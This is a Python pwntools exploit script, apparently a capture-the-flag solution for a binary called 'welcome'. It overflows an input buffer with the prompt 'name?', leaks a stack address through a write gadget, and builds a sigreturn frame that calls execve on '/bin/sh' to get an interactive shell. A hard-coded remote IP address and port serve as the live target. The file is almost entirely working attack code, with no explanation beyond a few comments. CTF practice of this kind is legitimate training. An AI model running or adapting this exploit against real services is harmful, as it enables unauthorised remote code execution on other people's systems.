# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './welcome'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
# elf = ELF(binary)
# libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    # libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '124.71.204.225'
    port = '8888'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

# 烦死，处理了半天远程与本地环境的问题

def attack():
    
    read_gadget = 0x000000000400106
    syscall_ret = 0x00000000004000FF
    write_gadget = 0x000000000040016F
    main_addr = 0x000000000400102 
    bss_addr = 0x600000

    # dbg('*0x0000000000400182')
    # sa('name?' , 'a'*0x1a + p64(write_gadget) + 'a'*0x20 + p64(main_addr) + '\x00'*0x110 )
    sa('name?' , 'a'*0x1a + p64(write_gadget) + 'a'*0x20 + p64(main_addr) + '\x00'*0x318 )

    stack_addr = l64()

    # dbg()

    execve = SigreturnFrame()
    execve.rax = constants.SYS_execve
    execve.rdi = stack_addr - 0x229 + 0x200
    execve.rsi = 0x0 #execve函数二参
    execve.rdx = 0x0 #execve函数二参
    execve.rsp = stack_addr - 0x229
    execve.rip = syscall_ret

    payload = 'a'*0x1a
    payload += p64(read_gadget)
    payload += '\x00'*0x20
    payload += p64(syscall_ret)
    payload += str(execve)
    payload += '/bin/sh\x00'*0x50

    sa('name?' , payload )
    dbg()
    sa('name?' , 'a'*8 )

    # dbg()

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   welcome.py
@Time    :   2022/02/26 09:06:09
@Author  :   Niyah 
'''
